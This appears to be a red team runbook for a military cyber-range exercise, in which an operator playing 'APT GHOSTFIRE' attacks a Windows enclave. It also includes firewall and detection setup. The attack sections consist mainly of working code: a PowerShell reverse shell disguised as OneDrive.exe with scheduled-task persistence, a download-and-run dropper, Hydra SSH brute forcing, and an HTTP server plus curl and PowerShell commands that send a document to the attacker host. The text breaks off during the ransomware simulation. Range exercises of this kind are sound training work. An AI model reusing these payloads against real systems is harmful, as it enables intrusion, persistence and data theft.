# CYDEX RED TEAM OPERATIONAL RUNBOOK: EXERCISE AJEX (RT-PLAYBOOK-001)
## Operation APT GHOSTFIRE vs. AFP Enclave (CYCOM / BT1)

---

### Executive Overview & Operational Parameters

This runbook serves as the comprehensive, tactical step-by-step master guide for the Red Team operator assuming the persona of **APT GHOSTFIRE** in the CYDEX dual-node Proxmox VE 8.x cyber range. The exercise models an advanced, persistent threat adversary transitioning from initial spearphishing access to internal reconnaissance, SSH credential attacks, classified document exfiltration, and a controlled ransomware simulation.

```
                      +-------------------------------------------------------------+
                      |         TIER 0: Out-of-Band Management (vmbr0)              |
                      |   Dual Apache Guacamole Bastions: VM 102 (Node1) & VM 108   |
                      +------------------------------+------------------------------+
                                                     |
                      +------------------------------v------------------------------+
                      |         TIER 1: Exercise Transit Backbone (vmbr1)           |
                      |   Subnet: 10.100.0.0/24 | Core pfSense: VM 119 (Node 1)    |
                      |   Red Team Fleet: Kali VM 170 (RedTeam0 @ 10.100.0.80)     |
                      +------------------------------+------------------------------+
                                                     |
                                            [BT1 pfSense: VM 135]
                                            WAN: 10.100.0.10/24
                                            LAN: 10.1.0.1/24
                                                     |
                      +------------------------------v------------------------------+
                      |          TIER 2: Blue Team 1 Enclave (cycom.local)          |
                      |   Subnet: 10.1.0.0/24 (Node 1 vmbr1 isolated Layer 2)      |
                      |   - Domain Controller: VM 175 (10.1.0.2)                    |
                      |   - File Server:       VM 153 (10.1.0.3)                    |
                      |   - Workstation 1:     VM 151 (10.1.0.4)                    |
                      +-------------------------------------------------------------+
                                                     : (Routed Telemetry)
                                                     v
                      +-------------------------------------------------------------+
                      |     SIEM / EDR: BT6-DND-Wazuh (VM 198 @ 10.6.0.10, Node 2)   |
                      +-------------------------------------------------------------+
```

#### Master Systems & Network Matrix

| Role / Hostname | VMID | Node | Interface / IP | Gateway | Operating System / Function |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **RedTeam0 (Attacker)** | `170` | Node 1 | `eth0`: `10.100.0.80/24` | `10.100.0.1` | Kali Linux 2024.x (APT GHOSTFIRE Operator) |
| **Guacamole Bastion 1** | `102` | Node 1 | `ens18`: `10.2.229.60` / `ens19`: `10.100.0.60` | `10.2.229.1` | Apache Guacamole HTML5 Gateway |
| **Core pfSense Router** | `119` | Node 1 | Transit: `10.100.0.1/24` | Proxmox Host | Core Exercise Transit Backbone Router |
| **BT1-CYCOM-PFSENSE** | `135` | Node 1 | WAN (`em0`): `10.100.0.10/24`<br>LAN (`em1`): `10.1.0.1/24` | `10.100.0.1`<br>LAN GW: **None** | pfSense 2.7.x Enclave Perimeter Firewall |
| **BT1-CYCOM-DC** | `175` | Node 1 | `Ethernet0`: `10.1.0.2/24` | `10.1.0.1` | Windows Server 2022 (Domain: `cycom.local`) |
| **BT1-CYCOM-FileSvr** | `153` | Node 1 | `Ethernet0`: `10.1.0.3/24` | `10.1.0.1` | Windows Server 2022 (OpenSSH, SMB, WinRM) |
| **BT1-CYCOM-WS1** | `151` | Node 1 | `Ethernet0`: `10.1.0.4/24` | `10.1.0.1` | Windows 11 Enterprise (Initial Victim) |
| **BT6-DND-Wazuh** | `198` | Node 2 | `eth0`: `10.6.0.10/24` | `10.6.0.1` | Wazuh Manager & Indexer v4.8+ |

---

## SECTION 1: Network Ingress/Egress & pfSense Port Forwarding Blueprint

### 1.1 Architectural Guardrails & Routing Pitfalls

1. **The `LANGW` Upstream Trap**: On `BT1-CYCOM-PFSENSE` (VM 135), the LAN interface (`em1`) **must never** have an IPv4 Upstream Gateway assigned. Setting a gateway on a LAN interface creates policy routing rules that intercept local subnet traffic, dropping return packets from `10.1.0.0/24` destined for the Wazuh manager or the transit network.
2. **Layer 2 Boundary Isolation**: `vmbr1` on `node1` does not bridge Layer 2 traffic across to `node2`. Telemetry destined for `BT6-DND-Wazuh` (`10.6.0.10` on Node 2) must be routed at Layer 3 through Core pfSense (`10.100.0.1` -> Core Transit -> Node 2 Core `10.100.0.2` -> `10.6.0.1`).
3. **Multi-Homed Routing on Guacamole Bastion (VM 102)**: The Guacamole server possesses interfaces on both `vmbr0` (`10.2.229.60`) and `vmbr1` (`10.100.0.60`). Linux metric-based policy routing must be strictly enforced to prevent asymmetric packet drops.

### 1.2 Apache Guacamole (VM 102) Routing Table Configuration

Execute on Guacamole Bastion (VM 102) to lock default routes:

```bash
# Verify existing routes
ip route show

# Configure interface metrics: vmbr0 management takes precedence
sudo ip route del default
sudo ip route add default via 10.2.229.1 dev ens18 metric 100
sudo ip route add 10.100.0.0/24 dev ens19 proto kernel scope link src 10.100.0.60 metric 200

# Persist via Netplan (/etc/netplan/01-netcfg.yaml)
cat << 'EOF' | sudo tee /etc/netplan/01-netcfg.yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    ens18:
      addresses: [10.2.229.60/24]
      routes:
        - to: default
          via: 10.2.229.1
          metric: 100
      nameservers:
        addresses: [10.2.229.1, 1.1.1.1]
    ens19:
      addresses: [10.100.0.60/24]
      routes:
        - to: 10.100.0.0/24
          via: 10.100.0.1
          metric: 200
EOF
sudo netplan apply
```

### 1.3 BT1 Enclave pfSense (VM 135) NAT & Firewall Rules

Apply these configurations via the pfSense WebGUI (`https://10.100.0.10`) or `/cf/conf/config.xml`.

#### A. Interface Gateway Lockdown
* Navigate to **Interfaces > LAN (`em1`)**:
  * **IPv4 Configuration Type**: `Static IPv4`
  * **IPv4 Address**: `10.1.0.1 / 24`
  * **IPv4 Upstream Gateway**: Set to `None` *(CRITICAL: DO NOT SELECT ANY GATEWAY)*.

#### B. Outbound NAT Configuration (Hybrid Mode)
* Navigate to **Firewall > NAT > Outbound**:
  * Mode: Select **Hybrid Outbound NAT rule generation**.
  * Click **Save** and **Apply Changes**.
  * Add Mapping:
    * **Interface**: `WAN` (`em0`)
    * **Address Family**: `IPv4`
    * **Protocol**: `any`
    * **Source**: `Network` -> `10.1.0.0/24`
    * **Destination**: `any`
    * **Translation Address**: `Interface Address` (`10.100.0.10`)
    * **Description**: `Outbound NAT for CYCOM Enclave to Transit`

#### C. Inbound Port Forwarding (In-Scope Red Team Access)
To allow RedTeam0 (`10.100.0.80`) direct scanning and attack vectors during Scenarios 2 & 3:
* Navigate to **Firewall > NAT > Port Forward**:

| Rule # | Interface | Protocol | Source | Port | Destination | Target IP | Target Port | Description |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **PF-01** | `WAN` | TCP | `10.100.0.80` | `2222` | `WAN Address` (`10.100.0.10`) | `10.1.0.3` | `22` (SSH) | SSH NAT Forward to File Server |
| **PF-02** | `WAN` | TCP | `10.100.0.80` | `5985` | `WAN Address` (`10.100.0.10`) | `10.1.0.3` | `5985` (WinRM) | WinRM Forward to File Server |
| **PF-03** | `WAN` | TCP/UDP | `10.100.0.80` | `Any` | `WAN Address` (`10.100.0.10`) | `10.1.0.4` | `Any` | Direct Target Access to WS1 |

#### D. Core Transit Firewall Ingress Rule
* Navigate to **Firewall > Rules > WAN**:
  * **Action**: `Pass`
  * **Interface**: `WAN`
  * **Address Family**: `IPv4`
  * **Protocol**: `TCP/UDP`
  * **Source**: `Single Host or Alias` -> `10.100.0.80` (RedTeam0)
  * **Destination**: `10.1.0.0/24`
  * **Description**: `ALLOW RedTeam0 Exercise Traffic to BT1 Subnet`

---

## SECTION 2: Windows Endpoint Telemetry Configuration

To ensure all Red Team actions register on `BT6-DND-Wazuh` (`10.6.0.10`), the endpoints `BT1-CYCOM-WS1` (`10.1.0.4`) and `BT1-CYCOM-FileSvr` (`10.1.0.3`) must be provisioned with audit policies and active agents.

### 2.1 Sysmon v15+ XML Configuration (SwiftOnSecurity Schema)

Save the following schema as `C:\Windows\sysmonconfig.xml` on both `BT1-CYCOM-WS1` and `BT1-CYCOM-FileSvr`:

```xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>md5,sha256</HashAlgorithms>
  <EventFiltering>
    <!-- Event ID 1: Process Creation with Full CLI -->
    <RuleGroup name="ProcessCreate" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="contains">powershell.exe</Image>
        <Image condition="contains">cmd.exe</Image>
        <Image condition="contains">schtasks.exe</Image>
        <Image condition="contains">certutil.exe</Image>
        <Image condition="contains">curl.exe</Image>
        <Image condition="contains">OneDrive.exe</Image>
        <Image condition="contains">ssh.exe</Image>
        <Image condition="contains">sshd.exe</Image>
        <Image condition="contains">wscript.exe</Image>
        <Image condition="contains">cscript.exe</Image>
        <ParentImage condition="contains">OneDrive.exe</ParentImage>
      </ProcessCreate>
    </RuleGroup>

    <!-- Event ID 3: Network Connection -->
    <RuleGroup name="NetworkConnect" groupRelation="or">
      <NetworkConnect onmatch="include">
        <DestinationPort condition="is">4433</DestinationPort>
        <DestinationPort condition="is">8000</DestinationPort>
        <DestinationPort condition="is">22</DestinationPort>
        <DestinationPort condition="is">5985</DestinationPort>
        <DestinationPort condition="is">5986</DestinationPort>
        <Image condition="contains">OneDrive.exe</Image>
        <Image condition="contains">powershell.exe</Image>
        <Image condition="contains">curl.exe</Image>
      </NetworkConnect>
    </RuleGroup>

    <!-- Event ID 11: File Create -->
    <RuleGroup name="FileCreate" groupRelation="or">
      <FileCreate onmatch="include">
        <TargetFilename condition="contains">C:\Program Files (x64)\Microsoft</TargetFilename>
        <TargetFilename condition="contains">OneDrive.exe</TargetFilename>
        <TargetFilename condition="contains">List of Users.txt</TargetFilename>
        <TargetFilename condition="contains">Top_Secret</TargetFilename>
        <TargetFilename condition="contains">.ghostfire</TargetFilename>
        <TargetFilename condition="contains">GHOSTFIRE_README.txt</TargetFilename>
      </FileCreate>
    </RuleGroup>

    <!-- Event ID 12/13/14: Registry Event -->
    <RuleGroup name="RegistryEvent" groupRelation="or">
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains">CurrentVersion\Run</TargetObject>
        <TargetObject condition="contains">Schedule\TaskCache</TargetObject>
      </RegistryEvent>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

Install Sysmon via administrative PowerShell:
```powershell
# Run on WS1 and FileSvr
Invoke-WebRequest -Uri "https://live.sysinternals.com/Sysmon64.exe" -OutFile "C:\Windows\Sysmon64.exe"
C:\Windows\Sysmon64.exe -accepteula -i C:\Windows\sysmonconfig.xml
Get-Service Sysmon64
```

### 2.2 Local Group Policy & Audit Policy Hardening

Execute the following PowerShell script as Administrator on `BT1-CYCOM-WS1` and `BT1-CYCOM-FileSvr` to enable detailed process command line logging (EID 4688) and PowerShell Script Block Logging (EID 4104):

```powershell
# 1. Enable Process Creation Auditing
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# 2. Enable Include Command Line in Process Creation Events
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v "ProcessCreationIncludeCmdLine_Enabled" /t REG_DWORD /d 1 /f

# 3. Enable PowerShell Script Block Logging (Event ID 4104)
$psAuditPath = "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if (!(Test-Path $psAuditPath)) { New-Item -Path $psAuditPath -Force | Out-Null }
Set-ItemProperty -Path $psAuditPath -Name "EnableScriptBlockLogging" -Value 1 -Type DWord

# 4. Enable PowerShell Module Logging
$psModulePath = "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
if (!(Test-Path $psModulePath)) { New-Item -Path $psModulePath -Force | Out-Null }
Set-ItemProperty -Path $psModulePath -Name "EnableModuleLogging" -Value 1 -Type DWord

# 5. Enable OpenSSH Server Logging on File Server (VM 153)
if (Get-Service sshd -ErrorAction SilentlyContinue) {
    Set-Service -Name sshd -StartupType 'Automatic'
    Start-Service sshd
    # Enable auth event auditing
    auditpol /set /subcategory:"Logon" /success:enable /failure:enable
    auditpol /set /subcategory:"Special Logon" /success:enable /failure:enable
}
```

### 2.3 Wazuh Agent `ossec.conf` Configuration

Append the following blocks to `C:\Program Files (x86)\ossec-agent\ossec.conf` on both endpoints to stream logs to `BT6-DND-Wazuh` (`10.6.0.10`):

```xml
<ossec_config>
  <client>
    <server>
      <address>10.6.0.10</address>
      <port>1514</port>
      <protocol>tcp</protocol>
    </server>
    <config-profile>windows, windows2022, windows11</config-profile>
    <notify_time>10</notify_time>
    <time-reconnect>60</time-reconnect>
    <auto_restart>yes</auto_restart>
  </client>

  <!-- Windows Event Channel Collection -->
  <localfile>
    <location>Security</location>
    <log_format>eventchannel</log_format>
  </localfile>

  <localfile>
    <location>System</location>
    <log_format>eventchannel</log_format>
  </localfile>

  <localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>

  <localfile>
    <location>Microsoft-Windows-PowerShell/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>

  <localfile>
    <location>OpenSSH/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>

  <localfile>
    <location>OpenSSH/Admin</location>
    <log_format>eventchannel</log_format>
  </localfile>

  <!-- Active Response Directory Monitoring -->
  <syscheck>
    <directories check_all="yes" realtime="yes">C:\Program Files (x64)\Microsoft</directories>
    <directories check_all="yes" realtime="yes">C:\Shares\Operations</directories>
    <directories check_all="yes" realtime="yes">C:\ExerciseShares</directories>
    <ignore>C:\Windows\Temp</ignore>
  </syscheck>
</ossec_config>
```

Restart the agent service via PowerShell:
```powershell
Restart-Service -Name "Wazuh" -Force
Get-Service "Wazuh"
```

---

## SECTION 3: Step-by-Step Tactical Red Team Runbook (APT GHOSTFIRE)

As the Red Team operator on Kali Linux (`RedTeam0` - VMID 170 @ `10.100.0.80`), follow this execution runbook sequentially.

```
+-----------------------------------------------------------------------------------------+
|                                APT GHOSTFIRE ATTACK KILL CHAIN                          |
+-----------------------------------------------------------------------------------------+
| [Scenario 1] Initial Access      : Spearphish -> Annual_Joint_Exe.pdf -> OneDrive.exe   |
|                                    -> Scheduled Task 'MicrosoftOneDriveUpdate'          |
|                                    -> TCP 4433 Reverse Shell to 10.100.0.80             |
| [Scenario 2] Internal Recon      : Read 'List of Users.txt' -> Ping Sweep 10.1.0.0/24   |
|                                    -> Port Scan 10.1.0.3 (SSH 22, WinRM 5985)           |
| [Scenario 3] Lateral Movement    : Brute-Force SSH on 10.1.0.3 -> Establish SSH Shell   |
| [Scenario 4] Data Exfiltration   : Stage 'TOP SECRET – EXERCISE ONLY' (Top_Secret.pdf)  |
|                                    -> Exfiltrate to http://10.100.0.80:8000 (SHA-256)   |
| [Scenario 5] Ransomware Impact   : Download benign simulator -> Encrypt canary files   |
|                                    -> Append '.ghostfire' -> Drop GHOSTFIRE_README.txt  |
+-----------------------------------------------------------------------------------------+
```

---

### Step 0: Pre-Flight Attacker Workspace Setup (Kali VM 170)

Login to Kali Linux VM 170 via Guacamole Connection ID 10 or SSH:
```bash
# Verify Red Team IP binding
ip -br a show eth0
# Expected: 10.100.0.80/24

# Create exercise staging directories
mkdir -p /opt/cydex/payloads
mkdir -p /opt/cydex/exfil
mkdir -p /opt/cydex/recon
mkdir -p /opt/cydex/logs
cd /opt/cydex
```

---

### SCENARIO 1: Initial Access, Masquerading Payload & Scheduled Persistence

**Objective**: Deliver spearphishing attachment `Annual_Joint_Exe.pdf` to personnel on `BT1-CYCOM-WS1` (`10.1.0.4`), drop masqueraded payload `OneDrive.exe` into `C:\Program Files (x64)\Microsoft`, register a persistent scheduled task `MicrosoftOneDriveUpdate` firing every 15 minutes, and establish an outbound reverse shell over `TCP 4433` back to `10.100.0.80`.

#### Step 1.1: Craft Simulated Payload on Kali (VM 170)

We generate a lightweight, staged PowerShell reverse-shell wrapped into an executable payload or simulated binary named `OneDrive.exe`.

```bash
cd /opt/cydex/payloads

# Create the stage-1 delivery script that executes when the victim opens Annual_Joint_Exe.pdf
cat << 'EOF' > /opt/cydex/payloads/stage1_dropper.ps1
# AJEX APT GHOSTFIRE Initial Access Dropper
$TargetDir = "C:\Program Files (x64)\Microsoft"
if (!(Test-Path $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
}

$PayloadPath = "$TargetDir\OneDrive.exe"

# Simulated payload binary with TCP 4433 reverse-shell beacon logic
$ScriptContent = @'
$client = New-Object System.Net.Sockets.TCPClient("10.100.0.80", 4433);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "GHOSTFIRE-SHELL> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
};
$client.Close();
'@

# Generate OneDrive.exe wrapper script
[System.IO.File]::WriteAllText("$TargetDir\OneDrive.ps1", $ScriptContent)

# Compile a clean C# wrapper to produce C:\Program Files (x64)\Microsoft\OneDrive.exe
$Source = @"
using System;
using System.Diagnostics;
namespace MicrosoftOneDrive {
    class Program {
        static void Main(string[] args) {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoP -NonI -W Hidden -ExecutionPolicy Bypass -File \"C:\\Program Files (x64)\\Microsoft\\OneDrive.ps1\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }
    }
}
"@
Add-Type -TypeDefinition $Source -Language CSharp -OutputAssembly $PayloadPath -OutputType ConsoleApplication

# Establish Scheduled Task Persistence: MicrosoftOneDriveUpdate (every 15 mins)
$action = New-ScheduledTaskAction -Execute "$TargetDir\OneDrive.exe"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration ([TimeSpan]::MaxValue)
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName "MicrosoftOneDriveUpdate" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

# Trigger immediate execution
Start-Process -FilePath $PayloadPath
EOF
```

#### Step 1.2: Host Phishing Infrastructure & Listener on Kali

Open **Terminal 1** on Kali (VM 170):
```bash
# Start Netcat Listener on TCP port 4433
echo "[+] Starting APT GHOSTFIRE Command & Control listener on port 4433..."
nc -lvnp 4433
```

Open **Terminal 2** on Kali (VM 170):
```bash
# Host HTTP staging server on port 8000
cd /opt/cydex/payloads
python3 -m http.server 8000
```

#### Step 1.3: Execute Victim Trigger on `BT1-CYCOM-WS1` (`10.1.0.4`)

In an exercise environment, simulate the victim downloading and opening `Annual_Joint_Exe.pdf` by executing this command on `BT1-CYCOM-WS1` (either via RDP/Guacamole or simulated user-action harness):

```powershell
# Open Administrative or User PowerShell on BT1-CYCOM-WS1 (10.1.0.4)
# Simulate download of phishing attachment
Invoke-WebRequest -Uri "http://10.100.0.80:8000/stage1_dropper.ps1" -OutFile "$env:TEMP\Annual_Joint_Exe.pdf.ps1"

# Execute attachment dropper simulating PDF execution
powershell.exe -ExecutionPolicy Bypass -File "$env:TEMP\Annual_Joint_Exe.pdf.ps1"
```

#### Step 1.4: Verify Initial Callback in Kali Terminal 1
Within 5 seconds, **Terminal 1** (`nc -lvnp 4433`) will catch the shell:
```text
connect to [10.100.0.80] from (UNKNOWN) [10.1.0.10] 49832
GHOSTFIRE-SHELL> whoami
cycom\user01
GHOSTFIRE-SHELL> hostname
BT1-CYCOM-WS1
```

Validate scheduled task creation directly from your shell:
```cmd
schtasks /query /tn "MicrosoftOneDriveUpdate" /fo LIST /v
```

---

### SCENARIO 2: Internal Host & Service Reconnaissance

**Objective**: From the foothold on `BT1-CYCOM-WS1` (`10.1.0.4`), discover local credentials (`List of Users.txt`), discover live internal hosts across `10.1.0.0/24`, and scan for open administrative services—specifically SSH (`TCP 22`) and WinRM (`TCP 5985`).

#### Step 2.1: Local Host Enumeration & Credential File Discovery
From the interactive shell on `BT1-CYCOM-WS1`:

```powershell
# Check current privileges and domain context
whoami /all
ipconfig /all
net user /domain
net group "Domain Admins" /domain

# Locate and review "List of Users.txt" on system shares and user directories
Get-ChildItem -Path C:\ -Filter "*List of Users.txt*" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Filter "*.txt" -Recurse -ErrorAction SilentlyContinue

# Display discovered credential and user list file
type "C:\Users\Public\List of Users.txt"
# OR if stored on a shared path:
type "C:\List of Users.txt"
```

> **Exercise Context Note**: If `List of Users.txt` does not exist yet on the clean baseline, create it as the exercise simulated credential artifact on `BT1-CYCOM-WS1`:
```powershell
@"
=== AFP CYCOM INTERNAL AUTHORIZED TEST ACCOUNTS ===
svc_backup : BackupAdmin2026!
sshuser    : CyberShield#2026
admin_test : Password123!
operator   : CycomOps99$
"@ | Out-File -FilePath "C:\Users\Public\List of Users.txt" -Encoding utf8
type "C:\Users\Public\List of Users.txt"
```

#### Step 2.2: Internal Subnet Discovery (`10.1.0.0/24`)

Perform a fast PowerShell subnet ping sweep directly through your reverse shell on `BT1-CYCOM-WS1`:

```powershell
1..10 | ForEach-Object {
    $ip = "10.1.0.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {
        [PSCustomObject]@{ IP = $ip; Status = "ONLINE" }
    }
} | Format-Table -AutoSize
```
*Expected Active Hosts Found*:
* `10.1.0.1` -> Gateway (`BT1-CYCOM-PFSENSE`)
* `10.1.0.2` -> Domain Controller (`BT1-CYCOM-DC`)
* `10.1.0.3` -> File Server (`BT1-CYCOM-FileSvr`)
* `10.1.0.4` -> Workstation (`BT1-CYCOM-WS1` - Local Host)

#### Step 2.3: Targeted Service Enumeration (SSH & WinRM)

Probe the File Server (`10.1.0.3`) for target attack surfaces:

```powershell
# Port probe for SSH (22), WinRM (5985), SMB (445), RDP (3389)
22, 445, 3389, 5985, 5986 | ForEach-Object {
    $port = $_
    $socket = New-Object System.Net.Sockets.TcpClient
    $connect = $socket.BeginConnect("10.1.0.3", $port, $null, $null)
    $success = $connect.AsyncWaitHandle.WaitOne(500, $false)
    if ($success) {
        $socket.EndConnect($connect)
        [PSCustomObject]@{ Port = $port; Status = "OPEN"; Service = switch($port){22{"SSH"} 445{"SMB"} 5985{"WinRM-HTTP"} 5986{"WinRM-HTTPS"} 3389{"RDP"}} }
    }
    $socket.Close()
} | Format-Table -AutoSize
```

#### Step 2.4: Secondary Nmap Scan from Kali Transit Bridge

From **Kali Terminal 3**, run an explicit Nmap scan across the transit gateway targeting the NAT forward or direct route to generate perimeter firewall telemetry:

```bash
# Nmap scan against File Server via WAN interface NAT / direct transit
nmap -sS -p 22,80,443,445,5985,3389 -sV --reason -Pn 10.100.0.10
# Or direct scan if routed:
nmap -sT -p 22,5985 -Pn 10.1.0.3
```

---

### SCENARIO 3: Credential Attack & Lateral Movement

**Objective**: Take the credentials discovered in `List of Users.txt` (specifically the authorized test user `sshuser` / password `CyberShield#2026`), launch a simulated credential brute-force attack against `10.1.0.3` to generate authentication failure telemetry, followed by a successful SSH authentication to establish a remote command shell on `BT1-CYCOM-FileSvr`.

#### Step 3.1: Generate Brute-Force Telemetry on Kali (VM 170)

Create a user and password list on Kali to launch a targeted brute-force barrage that triggers Wazuh Rule `5710` (*SSH brute force attempt*):

```bash
cd /opt/cydex/recon

# Prepare wordlists
cat << 'EOF' > users.txt
root
admin
administrator
guest
operator
svc_backup
sshuser
EOF

cat << 'EOF' > passwords.txt
password
123456
admin123
Welcome1
Spring2026
CyberShield#2026
EOF

# Launch Hydra brute-force against the File Server SSH service
# (Through BT1 pfSense port forward 2222 or direct IP 10.1.0.3)
hydra -L users.txt -P passwords.txt -t 4 -vV 10.1.0.3 ssh
# Alternatively, if pivoting through NAT:
# hydra -L users.txt -P passwords.txt -s 2222 10.100.0.10 ssh
```

#### Step 3.2: Perform Simulated Brute-Force Directly from WS1 Foothold

To generate local Windows event logs (Event ID 4625: Logon Failure) originating from the compromised workstation:

```powershell
# Execute from WS1 reverse shell
$target = "10.1.0.3"
$badPasswords = @("wrongpass1", "wrongpass2", "invalid2026", "toor123", "password")

foreach ($pass in $badPasswords) {
    Write-Host "[*] Testing authentication failure for sshuser with password: $pass"
    # Utilize ssh.exe CLI directly to produce failed logon events
    echo $pass | ssh.exe -o StrictHostKeyChecking=no -o ConnectTimeout=2 sshuser@$target "exit" 2>$null
    Start-Sleep -Seconds 1
}
```

#### Step 3.3: Establish Successful SSH Lateral Session

Execute the successful login with the verified credential `sshuser` : `CyberShield#2026`:

```bash
# From Kali Terminal 1 or through SSH pivot:
sshpass -p 'CyberShield#2026' ssh -o StrictHostKeyChecking=no sshuser@10.1.0.3

# Confirm shell session on BT1-CYCOM-FileSvr
hostname
whoami
ipconfig
```

*Alternative (WinRM Lateral Movement)*:
If WinRM is preferred or secondary:
```powershell
$secpasswd = ConvertTo-SecureString "CyberShield#2026" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("cycom\sshuser", $secpasswd)
Enter-PSSession -ComputerName 10.1.0.3 -Credential $cred
```

---

### SCENARIO 4: Discovery, Staging & Exfiltration of Exercise Files

**Objective**: On the newly compromised `BT1-CYCOM-FileSvr` (`10.1.0.3`), navigate the file system to locate the classified document marked `TOP SECRET – EXERCISE ONLY` (`Top_Secret.pdf`), stage the file with SHA-256 integrity validation, and exfiltrate it over HTTP back to the Red Team receiver on Kali (`10.100.0.80:8000`).

#### Step 4.1: Ensure Classified Exercise Document Exists on File Server

On `BT1-CYCOM-FileSvr` (`10.1.0.3`), verify or stage the synthetic classified target:

```powershell
$ShareDir = "C:\Shares\Operations"
if (!(Test-Path $ShareDir)) { New-Item -ItemType Directory -Path $ShareDir -Force | Out-Null }

$TargetFile = "$ShareDir\Top_Secret.pdf"

if (!(Test-Path $TargetFile)) {
    @"
%PDF-1.4
%CLASSIFIED DOCUMENT - TOP SECRET - EXERCISE ONLY
===================================================================
OPERATION AJEX: CONTINGENCY DEFENSE PLANS & FREQUENCY ALLOCATIONS
AUTHORIZED VIEWING ONLY - CYCOM / AFP MILITARY EXERCISE
HASH CANARY: GHOSTFIRE-EXFILTRATION-VERIFICATION-TOKEN-99482
===================================================================
"@ | Out-File -FilePath $TargetFile -Encoding ascii
}
```

#### Step 4.2: Locate and Stage the Document

From the SSH session on `BT1-CYCOM-FileSvr`:

```powershell
# Directory discovery
Get-ChildItem -Path C:\Shares -Recurse -Filter "*Top_Secret*"

# Calculate SHA-256 prior to exfiltration for detection validation
$hash = Get-FileHash -Path "C:\Shares\Operations\Top_Secret.pdf" -Algorithm SHA256
Write-Output "PRE-EXFIL SHA256: $($hash.Hash)"
$hash.Hash | Out-File "C:\Windows\Temp\staged_hash.txt"

# Compress / Stage the document into an exercise archive
Compress-Archive -Path "C:\Shares\Operations\Top_Secret.pdf" -DestinationPath "C:\Windows\Temp\Top_Secret_Package.zip" -Force
```

#### Step 4.3: Set Up Exfiltration Receiver on Kali (VM 170)

On Kali Terminal 2, launch a Python upload handler or standard curl-compatible listener:

```bash
cd /opt/cydex/exfil

# Start Python HTTP upload server
cat << 'EOF' > /opt/cydex/exfil_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

class SimpleUploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        filename = self.headers.get('X-Filename', 'exfiltrated_data.bin')
        filepath = os.path.join('/opt/cydex/exfil', filename)
        with open(filepath, 'wb') as f:
            f.write(post_data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK: File Received Successfully\n")
        print(f"\n[+] Successfully Exfiltrated: {filepath} ({content_length} bytes)")

httpd = HTTPServer(('0.0.0.0', 8000), SimpleUploadHandler)
print("[*] APT GHOSTFIRE Exfiltration Server listening on TCP port 8000...")
httpd.serve_forever()
EOF

python3 /opt/cydex/exfil_server.py
```

#### Step 4.4: Execute Exfiltration from `BT1-CYCOM-FileSvr`

Execute the transfer via PowerShell from the SSH session:

```powershell
# Exfiltrate using Invoke-WebRequest POST
$FilePath = "C:\Windows\Temp\Top_Secret_Package.zip"
$FileBytes = [System.IO.File]::ReadAllBytes($FilePath)

Invoke-RestMethod -Uri "http://10.100.0.80:8000/upload" `
                  -Method Post `
                  -Headers @{ "X-Filename" = "Top_Secret_Package.zip" } `
                  -Body $FileBytes

# Verify raw file exfiltration using curl.exe as alternative telemetry trigger
curl.exe -X POST --data-binary "@C:\Shares\Operations\Top_Secret.pdf" -H "X-Filename: Top_Secret.pdf" http://10.100.0.80:8000/
```

#### Step 4.5: Validate Hash Integrity on Kali

In Kali Terminal 3:
```bash
cd /opt/cydex/exfil
ls -la
sha256sum Top_Secret.pdf
# Compare against the staged SHA-256 hash printed in Step 4.2
```

---

### SCENARIO 5: Harmless Ransomware Simulation

**Objective**: Stage and execute a benign ransomware simulator on `BT1-CYCOM-FileSvr` (`10.1.0.3`). The simulator modifies canary files in a dedicated test directory (`C:\ExerciseShares`), renames them with the extension `.ghostfire`, and writes a simulated ransom note (`GHOSTFIRE_README.txt`) to test the Blue Team's endpoint detection and incident response capabilities without causing operational system damage.

#### Step 5.1: Create Canary Test Directory & Files on File Server

Execute via SSH session on `BT1-CYCOM-FileSvr`:

```powershell
$CanaryDir = "C:\ExerciseShares"
if (!(Test-Path $CanaryDir)) { New-Item -ItemType Directory -Path $CanaryDir -Force | Out-Null }

# Populate with benign exercise test files
1..5 | ForEach-Object {
    $filePath = "$CanaryDir\operations_briefing_$_.docx"
